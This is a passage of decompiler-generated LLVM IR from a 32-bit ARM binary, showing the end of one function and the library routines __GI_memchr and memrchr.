  %v6_16298 = add i32 %v1_16238.pre, 8
  %v7_16298 = inttoptr i32 %v6_16298 to i32*
  %v8_16298 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v8_16298, i32* %v7_16298, align 4
  br label %dec_label_pc_162cc

dec_label_pc_162a0:                               ; preds = %dec_label_pc_16274
  store i32 %v3_16274, i32* %ip.global-to-local, align 4
  %v1_162a4 = add i32 %v3_16274, 16
  %v2_162a4 = inttoptr i32 %v1_162a4 to i32*
  %v3_162a4 = load i32, i32* %v2_162a4, align 4
  store i32 %v3_162a4, i32* %r3.global-to-local, align 4
  %v7_162a8 = icmp eq i32 %v3_162a4, 48
  store i1 %v7_162a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_162a8, label %.thread54.thread70, label %bb256

bb256:                                            ; preds = %dec_label_pc_162a0
  store i32 %v2_1623c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_162c8

.thread54.thread70:                               ; preds = %dec_label_pc_162a0
  %v4_162b4 = load i32, i32* %stack_var_-164, align 4
  store i32 %v1_16238.pre, i32* %r6.global-to-local, align 4
  %v3_162bc = add i32 %v4_162b4, %v2_16254
  store i32 %v3_162bc, i32* %r3.global-to-local, align 4
  store i32 %v3_162bc, i32* %stack_var_-164, align 4
  br label %dec_label_pc_162cc

dec_label_pc_162c8:                               ; preds = %bb256, %bb254
  store i32 %v1_16238.pre, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_162cc

dec_label_pc_162cc:                               ; preds = %.thread54.thread70, %dec_label_pc_16284, %dec_label_pc_162c8
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_162d0 = ptrtoint i32* %stack_var_-180 to i32
  store i32 %v2_162d0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_162d4

dec_label_pc_162d4:                               ; preds = %dec_label_pc_162fc, %dec_label_pc_162cc
  %v0_162d4 = phi i32 [ %v1_162f0, %dec_label_pc_162fc ], [ %v2_162d0, %dec_label_pc_162cc ]
  %v1_162d4 = inttoptr i32 %v0_162d4 to i32*
  %v2_162d4 = load i32, i32* %v1_162d4, align 4
  store i32 %v2_162d4, i32* %r1.global-to-local, align 4
  %v3_162d4 = add i32 %v0_162d4, 4
  %v4_162d4 = inttoptr i32 %v3_162d4 to i32*
  %v5_162d4 = load i32, i32* %v4_162d4, align 4
  store i32 %v5_162d4, i32* %r2.global-to-local, align 4
  %v6_162d4 = add i32 %v0_162d4, 8
  %v7_162d4 = inttoptr i32 %v6_162d4 to i32*
  %v8_162d4 = load i32, i32* %v7_162d4, align 4
  store i32 %v8_162d4, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 %arg5, i32* %ip.global-to-local, align 4
  store i32 90856, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg5)
  %v0_162e8 = load i32, i32* %r5.global-to-local, align 4
  %v1_162e8 = add i32 %v0_162e8, 4
  %v2_162e8 = inttoptr i32 %v1_162e8 to i32*
  %v3_162e8 = load i32, i32* %v2_162e8, align 4
  store i32 %v3_162e8, i32* %r3.global-to-local, align 4
  %v0_162ec = load i32, i32* %r0.global-to-local, align 4
  %v9_162ec = icmp eq i32 %v0_162ec, %v3_162e8
  store i1 %v9_162ec, i1* %cpsr_z.global-to-local, align 1
  %v1_162f0 = add i32 %v0_162e8, 12
  store i32 %v1_162f0, i32* %r5.global-to-local, align 4
  br i1 %v9_162ec, label %dec_label_pc_162fc, label %bb257

bb257:                                            ; preds = %dec_label_pc_162d4
  store i32 -1, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1631c

dec_label_pc_162fc:                               ; preds = %dec_label_pc_162d4
  %v0_16300.pre = load i32, i32* %r7.global-to-local, align 4
  %v1_162fc = load i32, i32* %r6.global-to-local, align 4
  %v3_162fc = icmp ult i32 %v1_162f0, %v1_162fc
  %v9_162fc = icmp eq i32 %v1_162f0, %v1_162fc
  store i1 %v9_162fc, i1* %cpsr_z.global-to-local, align 1
  %v2_16300 = add i32 %v0_16300.pre, %v3_162e8
  store i32 %v2_16300, i32* %r7.global-to-local, align 4
  br i1 %v3_162fc, label %dec_label_pc_162d4, label %dec_label_pc_1631c

dec_label_pc_16314:                               ; preds = %.thread21, %bb239
  %v0_16314 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_16314, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_16014

dec_label_pc_1631c:                               ; preds = %dec_label_pc_162fc, %bb257
  %v0_1631c = phi i32 [ -1, %bb257 ], [ %v2_16300, %dec_label_pc_162fc ]
  store i32 %v0_1631c, i32* %r0.global-to-local, align 4
  store i32 %v27_15b58, i32* @lr, align 4
  ret i32 %v0_1631c

; uselistorder directives
  uselistorder i32 %v0_1631c, { 1, 0 }
  uselistorder i32 %v1_162fc, { 1, 0 }
  uselistorder i32 %v1_162f0, { 0, 1, 3, 2 }
  uselistorder i32 %v0_162d4, { 2, 1, 0 }
  uselistorder i32 %v3_16274, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1623c, { 0, 1, 3, 2 }
  uselistorder i32 %v4_16230, { 1, 2, 0 }
  uselistorder i32 %v0_16230, { 1, 0 }
  uselistorder i32 %v1_16238.pre, { 6, 5, 3, 2, 1, 4, 0 }
  uselistorder i32 %v2_161f0, { 2, 3, 4, 1, 0 }
  uselistorder i32 %v6_161ec, { 2, 1, 0 }
  uselistorder i32 %storemerge158, { 1, 0 }
  uselistorder i32 %v0_161b0, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v2_16178, { 1, 0 }
  uselistorder i32 %v1_16178, { 1, 2, 0, 3 }
  uselistorder i32 %v2_16174, { 2, 4, 0, 1, 3, 5 }
  uselistorder i1 %v2_160d4, { 2, 1, 0 }
  uselistorder i32 %v2_16054, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v2_16044, { 1, 2, 3, 5, 0, 4, 6 }
  uselistorder i1 %v2_16030, { 1, 0, 2 }
  uselistorder i32 %v5_1602c, { 0, 2, 1, 3 }
  uselistorder i32 %v1_160bc30, { 3, 0, 4, 6, 1, 2, 5, 7, 8, 9 }
  uselistorder i1 %v2_15fe4, { 1, 0 }
  uselistorder i32 %v1_15fdc, { 1, 2, 0 }
  uselistorder i32 %v2_15fd0, { 1, 0 }
  uselistorder i32 %v1_15fd0, { 1, 2, 0, 3 }
  uselistorder i32 %v0_15fd0, { 3, 4, 0, 5, 6, 1, 2, 7 }
  uselistorder i1 %v3_15fa0, { 1, 0 }
  uselistorder i32 %v0_15fa0, { 0, 2, 1 }
  uselistorder i32 %v2_15f9c, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v1_15f88, { 1, 0 }
  uselistorder i1 %v2_15f78, { 1, 0 }
  uselistorder i32 %v1_15f74, { 3, 2, 1, 0 }
  uselistorder i32 %v2_15f70, { 1, 0 }
  uselistorder i1 %v2_15f60, { 1, 0 }
  uselistorder i32 %v1_15f54, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v2_15f08, { 1, 2, 0, 3 }
  uselistorder i32 %v0_15f08, { 1, 0, 2 }
  uselistorder i1 %v2_15ef0, { 1, 0 }
  uselistorder i32 %v5_15ed8, { 1, 0 }
  uselistorder i32 %v0_15ec4, { 1, 2, 0, 3 }
  uselistorder i32 %v0_15eac, { 1, 2, 0 }
  uselistorder i32 %v2_15ea8, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_15e40, { 2, 4, 1, 0, 3 }
  uselistorder i32 %stack_var_-192.4, { 1, 2, 0, 3 }
  uselistorder i32 %v0_15de8, { 1, 0 }
  uselistorder double %v2_15dac, { 1, 0 }
  uselistorder i64 %v3_15da8, { 1, 0 }
  uselistorder i32 %v0_15d68, { 1, 2, 0, 4, 3, 5 }
  uselistorder i32 %v3_15d5c, { 1, 0 }
  uselistorder i32 %v2_15d98, { 1, 3, 0, 2 }
  uselistorder i32 %v0_15d2c, { 1, 0 }
  uselistorder i32 %v5_15ce8, { 1, 0 }
  uselistorder i32 %v1_15c08.v0_15bf45, { 1, 0 }
  uselistorder i32 %v3_15cc4, { 1, 0 }
  uselistorder i32 %v0_15ca0, { 0, 2, 3, 1 }
  uselistorder i32 %v2_15c88, { 2, 1, 0 }
  uselistorder i32 %v0_15c6c, { 1, 0 }
  uselistorder i32 %v0_15b8c, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32* %stack_var_-156, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-83, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-82, { 1, 2, 0 }
  uselistorder i32* %stack_var_-180, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-47, { 1, 0 }
  uselistorder i32* %stack_var_-164, { 0, 1, 4, 2, 3 }
  uselistorder i8* %stack_var_-46, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32* %stack_var_0, { 2, 3, 0, 1 }
  uselistorder i32 %tmp160, { 1, 0, 2, 3 }
  uselistorder i32* %sb.global-to-local, { 2, 3, 4, 5, 6, 0, 7, 8, 1, 9 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 12, 11, 13 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3, 4, 13, 14, 15, 5, 16, 17, 6, 18, 19, 20, 7, 21, 22, 8, 23, 24, 9, 10, 11, 12, 25, 26, 27, 28, 30, 29, 31, 32 }
  uselistorder i32* %r6.global-to-local, { 21, 0, 22, 1, 2, 3, 4, 19, 20, 5, 6, 9, 10, 11, 7, 12, 13, 8, 14, 17, 15, 16, 18 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 9, 7, 10, 11, 8, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 19, 17, 18, 20, 21, 22, 23, 24, 25, 26, 28, 42, 29, 33, 30, 31, 32, 34, 27, 35, 36, 37, 38, 39, 40, 41, 63, 44, 43, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 66, 64, 65, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 18, 15, 19, 20, 16, 17, 21, 22, 23, 26, 24, 25, 27, 28, 29, 30, 32, 31, 33, 34, 35, 36, 37, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 13, 10, 11, 14, 16, 12, 17, 15, 18, 19, 36, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35 }
  uselistorder i32* %r0.global-to-local, { 5, 6, 7, 8, 3, 9, 10, 33, 37, 35, 34, 11, 12, 36, 13, 14, 38, 16, 15, 1, 17, 18, 2, 4, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 6, 7, 8, 3, 4, 5, 9, 12, 10, 11, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %fp.global-to-local, { 3, 4, 0, 1, 5, 2, 6 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 61, 18, 19, 20, 21, 22, 23, 24, 25, 60, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 59, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58 }
  uselistorder i32 112, { 2, 6, 0, 7, 3, 1, 8, 4, 5 }
  uselistorder i8 48, { 3, 5, 6, 7, 8, 9, 0, 10, 1, 2, 11, 4 }
  uselistorder i32 (i8*, i32, i32)* @__GI_memset, { 1, 2, 9, 10, 11, 12, 17, 8, 13, 14, 7, 18, 19, 5, 6, 21, 20, 0, 3, 4, 15, 16 }
  uselistorder i32 17, { 0, 2, 3, 1, 5, 4 }
  uselistorder i32 (i32, i32, i32, i32)* @__aeabi_dcmpge, { 1, 0 }
  uselistorder i32 1104006501, { 4, 1, 2, 0, 3 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 -33936), { 0, 2, 1 }
  uselistorder i32 1100470148, { 1, 2, 0, 3 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 -33960), { 2, 1, 0 }
  uselistorder i32 96, { 1, 2, 5, 3, 4, 0 }
  uselistorder i8 45, { 1, 4, 2, 5, 3, 0, 6, 7 }
  uselistorder i32 45, { 2, 0, 3, 4, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @__aeabi_dcmplt, { 3, 2, 1, 0 }
  uselistorder double 0.000000e+00, { 2, 1, 0, 3 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__aeabi_dcmpeq, { 2, 1, 0 }
  uselistorder i8 32, { 0, 2, 3, 4, 1, 5 }
  uselistorder i8 43, { 0, 2, 1 }
  uselistorder i32 97, { 1, 0, 7, 5, 6, 8, 2, 3, 4 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg4, { 0, 1, 2, 6, 5, 4, 3, 8, 7, 9 }
  uselistorder label %dec_label_pc_16314, { 1, 0 }
  uselistorder label %dec_label_pc_162cc, { 2, 0, 1 }
  uselistorder label %bb254, { 1, 0 }
  uselistorder label %dec_label_pc_1622c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_161a4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16174, { 1, 0 }
  uselistorder label %.thread46, { 1, 0 }
  uselistorder label %dec_label_pc_1614c, { 1, 0 }
  uselistorder label %dec_label_pc_16120, { 2, 1, 0 }
  uselistorder label %dec_label_pc_160fc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_160cc, { 2, 1, 0 }
  uselistorder label %.thread34, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16014, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_16004, { 1, 0 }
  uselistorder label %bb236, { 1, 0 }
  uselistorder label %bb234, { 1, 0 }
  uselistorder label %bb232, { 1, 0 }
  uselistorder label %.thread145, { 1, 0 }
  uselistorder label %._crit_edge93, { 1, 0 }
  uselistorder label %bb228, { 1, 0 }
  uselistorder label %bb226, { 1, 0 }
  uselistorder label %.preheader, { 3, 1, 0, 2 }
  uselistorder label %bb223, { 1, 0 }
  uselistorder label %dec_label_pc_15f2c, { 2, 1, 0 }
  uselistorder label %bb220, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15e38, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_15de8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15de0, { 1, 0 }
  uselistorder label %bb212, { 1, 0 }
  uselistorder label %.thread124, { 1, 0 }
  uselistorder label %dec_label_pc_15cc4, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %dec_label_pc_15be0, { 1, 0 }
  uselistorder label %bb205, { 1, 0 }
  uselistorder label %bb203, { 1, 0 }
  uselistorder label %bb201, { 1, 0 }
}

define i32 @__GI_memchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_16350 = urem i32 %arg1, 256
  %v0_1636c.pr = load i32, i32* @r2, align 4
  %v2_1636c15 = icmp eq i32 %v0_1636c.pr, 0
  %v0_16380.pre = load i32, i32* @r0, align 4
  br i1 %v2_1636c15, label %dec_label_pc_1637c, label %dec_label_pc_16374

dec_label_pc_16358:                               ; preds = %dec_label_pc_16374
  %v1_16358 = inttoptr i32 %v0_16368 to i8*
  %v2_16358 = load i8, i8* %v1_16358, align 1
  %v3_16358 = zext i8 %v2_16358 to i32
  %v9_1635c = icmp eq i32 %v3_16358, %v1_16350
  br i1 %v9_1635c, label %dec_label_pc_1642c, label %dec_label_pc_16364

dec_label_pc_16364:                               ; preds = %dec_label_pc_16358
  %v1_16364 = add i32 %v0_16364, -1
  %v1_16368 = add i32 %v0_16368, 1
  %v2_1636c = icmp eq i32 %v1_16364, 0
  br i1 %v2_1636c, label %dec_label_pc_1637c, label %dec_label_pc_16374

dec_label_pc_16374:                               ; preds = %entry, %dec_label_pc_16364
  %v0_16364 = phi i32 [ %v1_16364, %dec_label_pc_16364 ], [ %v0_1636c.pr, %entry ]
  %v0_16368 = phi i32 [ %v1_16368, %dec_label_pc_16364 ], [ %v0_16380.pre, %entry ]
  %v1_16374 = urem i32 %v0_16368, 4
  %v2_16374 = icmp eq i32 %v1_16374, 0
  br i1 %v2_16374, label %dec_label_pc_1637c, label %dec_label_pc_16358

dec_label_pc_1637c:                               ; preds = %dec_label_pc_16364, %dec_label_pc_16374, %entry
  %v0_163f822 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_16364 ], [ %v0_16364, %dec_label_pc_16374 ]
  %v0_16380 = phi i32 [ %v0_16380.pre, %entry ], [ %v1_16368, %dec_label_pc_16364 ], [ %v0_16368, %dec_label_pc_16374 ]
  %v4_1637c = mul nuw nsw i32 %v1_16350, 256
  %v5_1637c = or i32 %v4_1637c, %v1_16350
  %v4_16384 = mul i32 %v5_1637c, 65536
  %v5_16384 = or i32 %v4_16384, %v5_1637c
  store i32 2130640639, i32* @ip, align 4
  %tmp = icmp ugt i32 %v0_163f822, 3
  br i1 %tmp, label %dec_label_pc_1638c, label %dec_label_pc_16420.preheader

dec_label_pc_1638c:                               ; preds = %dec_label_pc_1637c, %dec_label_pc_163f8.backedge
  %v0_163a860 = phi i32 [ %v1_163a8, %dec_label_pc_163f8.backedge ], [ %v0_163f822, %dec_label_pc_1637c ]
  %v0_163cc59 = phi i32 [ %v4_1638c, %dec_label_pc_163f8.backedge ], [ %v0_16380, %dec_label_pc_1637c ]
  %v1_1638c = inttoptr i32 %v0_163cc59 to i32*
  %v2_1638c = load i32, i32* %v1_1638c, align 4
  %v4_1638c = add i32 %v0_163cc59, 4
  %v2_16390 = xor i32 %v2_1638c, %v5_16384
  %v2_16394 = add i32 %v2_16390, 2130640639
  %v1_16398 = sub i32 -1, %v2_16390
  %v2_1639c = xor i32 %v2_16394, %v1_16398
  %v2_163a0 = and i32 %v2_1639c, -2130640640
  %v2_163a4 = icmp eq i32 %v2_163a0, 0
  %v1_163a8 = add i32 %v0_163a860, -4
  br i1 %v2_163a4, label %dec_label_pc_163f8.backedge, label %dec_label_pc_163b0

dec_label_pc_163f8.backedge:                      ; preds = %dec_label_pc_1638c, %dec_label_pc_163e8
  store i32 2130640639, i32* @ip, align 4
  %tmp73 = icmp ugt i32 %v1_163a8, 3
  br i1 %tmp73, label %dec_label_pc_1638c, label %dec_label_pc_16420.preheader

dec_label_pc_163b0:                               ; preds = %dec_label_pc_1638c
  %v2_163b0 = inttoptr i32 %v0_163cc59 to i8*
  %v3_163b0 = load i8, i8* %v2_163b0, align 1
  %v4_163b0 = zext i8 %v3_163b0 to i32
  %v9_163b8 = icmp eq i32 %v4_163b0, %v1_16350
  %v1_163bc = add i32 %v0_163cc59, 3
  store i32 %v1_163bc, i32* @ip, align 4
  br i1 %v9_163b8, label %dec_label_pc_1642c, label %dec_label_pc_163c4

dec_label_pc_163c4:                               ; preds = %dec_label_pc_163b0
  %v1_163c4 = add i32 %v0_163cc59, 1
  %v2_163c4 = inttoptr i32 %v1_163c4 to i8*
  %v3_163c4 = load i8, i8* %v2_163c4, align 1
  %v4_163c4 = zext i8 %v3_163c4 to i32
  %v9_163c8 = icmp eq i32 %v4_163c4, %v1_16350
  br i1 %v9_163c8, label %bb, label %dec_label_pc_163d8

bb:                                               ; preds = %dec_label_pc_163c4
  br label %dec_label_pc_1642c

dec_label_pc_163d8:                               ; preds = %dec_label_pc_163c4
  %v1_163d8 = add i32 %v0_163cc59, 2
  %v2_163d8 = inttoptr i32 %v1_163d8 to i8*
  %v3_163d8 = load i8, i8* %v2_163d8, align 1
  %v4_163d8 = zext i8 %v3_163d8 to i32
  %v9_163dc = icmp eq i32 %v4_163d8, %v1_16350
  br i1 %v9_163dc, label %dec_label_pc_1642c, label %dec_label_pc_163e8

dec_label_pc_163e8:                               ; preds = %dec_label_pc_163d8
  %v2_163e8 = inttoptr i32 %v1_163bc to i8*
  %v3_163e8 = load i8, i8* %v2_163e8, align 1
  %v4_163e8 = zext i8 %v3_163e8 to i32
  %v9_163ec = icmp eq i32 %v4_163e8, %v1_16350
  br i1 %v9_163ec, label %bb36, label %dec_label_pc_163f8.backedge

bb36:                                             ; preds = %dec_label_pc_163e8
  br label %dec_label_pc_1642c

dec_label_pc_16420.preheader:                     ; preds = %dec_label_pc_163f8.backedge, %dec_label_pc_1637c
  %v0_163cc.lcssa = phi i32 [ %v0_16380, %dec_label_pc_1637c ], [ %v4_1638c, %dec_label_pc_163f8.backedge ]
  %v0_163a8.lcssa = phi i32 [ %v0_163f822, %dec_label_pc_1637c ], [ %v1_163a8, %dec_label_pc_163f8.backedge ]
  %v2_164207 = icmp eq i32 %v0_163a8.lcssa, 0
  br i1 %v2_164207, label %dec_label_pc_16428, label %dec_label_pc_16410

dec_label_pc_16410:                               ; preds = %dec_label_pc_1641c, %dec_label_pc_16420.preheader
  %v0_16420.in = phi i32 [ %v0_16420, %dec_label_pc_1641c ], [ %v0_163a8.lcssa, %dec_label_pc_16420.preheader ]
  %v0_1641c = phi i32 [ %v1_1641c, %dec_label_pc_1641c ], [ %v0_163cc.lcssa, %dec_label_pc_16420.preheader ]
  %v0_16420 = add i32 %v0_16420.in, -1
  %v1_16410 = inttoptr i32 %v0_1641c to i8*
  %v2_16410 = load i8, i8* %v1_16410, align 1
  %v3_16410 = zext i8 %v2_16410 to i32
  %v9_16414 = icmp eq i32 %v3_16410, %v1_16350
  br i1 %v9_16414, label %dec_label_pc_1642c, label %dec_label_pc_1641c

dec_label_pc_1641c:                               ; preds = %dec_label_pc_16410
  %v1_1641c = add i32 %v0_1641c, 1
  %v2_16420 = icmp eq i32 %v0_16420, 0
  br i1 %v2_16420, label %dec_label_pc_16428, label %dec_label_pc_16410

dec_label_pc_16428:                               ; preds = %dec_label_pc_1641c, %dec_label_pc_16420.preheader
  br label %dec_label_pc_1642c

dec_label_pc_1642c:                               ; preds = %dec_label_pc_16358, %dec_label_pc_163d8, %dec_label_pc_163b0, %dec_label_pc_16410, %bb36, %bb, %dec_label_pc_16428
  %v1_16430 = phi i32 [ 0, %dec_label_pc_16428 ], [ %v1_163c4, %bb ], [ %v1_163bc, %bb36 ], [ %v0_1641c, %dec_label_pc_16410 ], [ %v1_163d8, %dec_label_pc_163d8 ], [ %v0_163cc59, %dec_label_pc_163b0 ], [ %v0_16368, %dec_label_pc_16358 ]
  ret i32 %v1_16430

; uselistorder directives
  uselistorder i32 %v1_163a8, { 1, 0, 2 }
  uselistorder i32 %v0_163cc59, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v5_1637c, { 1, 0 }
  uselistorder i32 %v0_163f822, { 1, 2, 0 }
  uselistorder i32 %v0_16368, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v0_16380.pre, { 1, 0 }
  uselistorder i32 %v1_16350, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder label %dec_label_pc_1642c, { 6, 3, 4, 1, 5, 2, 0 }
  uselistorder label %dec_label_pc_163f8.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_1638c, { 1, 0 }
  uselistorder label %dec_label_pc_1637c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16374, { 1, 0 }
}

define i32 @memrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_16440 = urem i32 %arg2, 256
  %v2_16444 = add i32 %arg3, %arg1
  %v2_1645c4 = icmp eq i32 %arg3, 0
  br i1 %v2_1645c4, label %dec_label_pc_1646c, label %dec_label_pc_16464

dec_label_pc_1644c:                               ; preds = %dec_label_pc_16464
  %v1_1644c = add i32 %v0_1644c, -1
  %v2_1644c = inttoptr i32 %v1_1644c to i8*
  %v3_1644c = load i8, i8* %v2_1644c, align 1
  %v4_1644c = zext i8 %v3_1644c to i32
  %v9_16450 = icmp eq i32 %v4_1644c, %v1_16440
  br i1 %v9_16450, label %dec_label_pc_1650c, label %dec_label_pc_16458

dec_label_pc_16458:                               ; preds = %dec_label_pc_1644c
  %v1_16458 = add i32 %v0_16458, -1
  %v2_1645c = icmp eq i32 %v1_16458, 0
  br i1 %v2_1645c, label %dec_label_pc_1646c, label %dec_label_pc_16464

dec_label_pc_16464:                               ; preds = %entry, %dec_label_pc_16458
  %v0_16458 = phi i32 [ %v1_16458, %dec_label_pc_16458 ], [ %arg3, %entry ]
  %v0_1644c = phi i32 [ %v1_1644c, %dec_label_pc_16458 ], [ %v2_16444, %entry ]
  %v1_16464 = urem i32 %v0_1644c, 4
  %v2_16464 = icmp eq i32 %v1_16464, 0
  br i1 %v2_16464, label %dec_label_pc_1646c, label %dec_label_pc_1644c

dec_label_pc_1646c:                               ; preds = %dec_label_pc_16458, %dec_label_pc_16464, %entry
  %v0_164f413 = phi i32 [ %v2_16444, %entry ], [ %v1_1644c, %dec_label_pc_16458 ], [ %v0_1644c, %dec_label_pc_16464 ]
  %v0_164e09 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_16458 ], [ %v0_16458, %dec_label_pc_16464 ]
  %v4_1646c = mul nuw nsw i32 %v1_16440, 256
  %v5_1646c = or i32 %v4_1646c, %v1_16440
  %v4_16470 = mul i32 %v5_1646c, 65536
  %v5_16470 = or i32 %v4_16470, %v5_1646c
  store i32 2130640639, i32* @ip, align 4
  %tmp = icmp ugt i32 %v0_164e09, 3
  br i1 %tmp, label %dec_label_pc_16478, label %dec_label_pc_16500

dec_label_pc_16478:                               ; preds = %dec_label_pc_1646c, %dec_label_pc_164e0.backedge
  %v0_1649440 = phi i32 [ %v1_16494, %dec_label_pc_164e0.backedge ], [ %v0_164e09, %dec_label_pc_1646c ]
  %v0_1647839 = phi i32 [ %v1_16478, %dec_label_pc_164e0.backedge ], [ %v0_164f413, %dec_label_pc_1646c ]
  %v1_16478 = add i32 %v0_1647839, -4
  %v2_16478 = inttoptr i32 %v1_16478 to i32*
  %v3_16478 = load i32, i32* %v2_16478, align 4
  %v2_1647c = xor i32 %v3_16478, %v5_16470
  %v2_16480 = add i32 %v2_1647c, 2130640639
  store i32 %v2_16480, i32* @ip, align 4
  %v1_16484 = sub i32 -1, %v2_1647c
  %v2_16488 = xor i32 %v2_16480, %v1_16484
  %v2_1648c = and i32 %v2_16488, -2130640640
  %v2_16490 = icmp eq i32 %v2_1648c, 0
  %v1_16494 = add i32 %v0_1649440, -4
  br i1 %v2_16490, label %dec_label_pc_164e0.backedge, label %dec_label_pc_1649c

dec_label_pc_164e0.backedge:                      ; preds = %dec_label_pc_16478, %dec_label_pc_164d4
  store i32 2130640639, i32* @ip, align 4
  %tmp46 = icmp ugt i32 %v1_16494, 3
  br i1 %tmp46, label %dec_label_pc_16478, label %dec_label_pc_16500

dec_label_pc_1649c:                               ; preds = %dec_label_pc_16478
  %v1_1649c = add i32 %v0_1647839, -1
  %v2_1649c = inttoptr i32 %v1_1649c to i8*
  %v3_1649c = load i8, i8* %v2_1649c, align 1
  %v4_1649c = zext i8 %v3_1649c to i32
  %v9_164a0 = icmp eq i32 %v4_1649c, %v1_16440
  br i1 %v9_164a0, label %dec_label_pc_164cc, label %dec_label_pc_164ac

dec_label_pc_164ac:                               ; preds = %dec_label_pc_1649c
  %v1_164ac = add i32 %v0_1647839, -2
  %v2_164ac = inttoptr i32 %v1_164ac to i8*
  %v3_164ac = load i8, i8* %v2_164ac, align 1
  %v4_164ac = zext i8 %v3_164ac to i32
  %v9_164b0 = icmp eq i32 %v4_164ac, %v1_16440
  br i1 %v9_164b0, label %dec_label_pc_164cc, label %dec_label_pc_164bc

dec_label_pc_164bc:                               ; preds = %dec_label_pc_164ac
  %v1_164bc = add i32 %v0_1647839, -3
  %v2_164bc = inttoptr i32 %v1_164bc to i8*
  %v3_164bc = load i8, i8* %v2_164bc, align 1
  %v4_164bc = zext i8 %v3_164bc to i32
  %v9_164c0 = icmp eq i32 %v4_164bc, %v1_16440
  br i1 %v9_164c0, label %dec_label_pc_164cc, label %dec_label_pc_164d4

dec_label_pc_164cc:                               ; preds = %dec_label_pc_164bc, %dec_label_pc_164ac, %dec_label_pc_1649c
  %v0_164cc = phi i32 [ %v1_164bc, %dec_label_pc_164bc ], [ %v1_164ac, %dec_label_pc_164ac ], [ %v1_1649c, %dec_label_pc_1649c ]
  br label %dec_label_pc_1650c

dec_label_pc_164d4:                               ; preds = %dec_label_pc_164bc
  %v1_164d4 = inttoptr i32 %v1_16478 to i8*
  %v2_164d4 = load i8, i8* %v1_164d4, align 1
  %v3_164d4 = zext i8 %v2_164d4 to i32
  %v9_164d8 = icmp eq i32 %v3_164d4, %v1_16440
  br i1 %v9_164d8, label %dec_label_pc_1650c, label %dec_label_pc_164e0.backedge

dec_label_pc_164f4:                               ; preds = %dec_label_pc_16500
  %v1_16500 = add i32 %v0_16500, -1
  %v1_164f4 = add i32 %v0_164f4, -1
  %v2_164f4 = inttoptr i32 %v1_164f4 to i8*
  %v3_164f4 = load i8, i8* %v2_164f4, align 1
  %v4_164f4 = zext i8 %v3_164f4 to i32
  %v9_164f8 = icmp eq i32 %v4_164f4, %v1_16440
  br i1 %v9_164f8, label %dec_label_pc_1650c, label %dec_label_pc_16500

dec_label_pc_16500:                               ; preds = %dec_label_pc_1646c, %dec_label_pc_164e0.backedge, %dec_label_pc_164f4
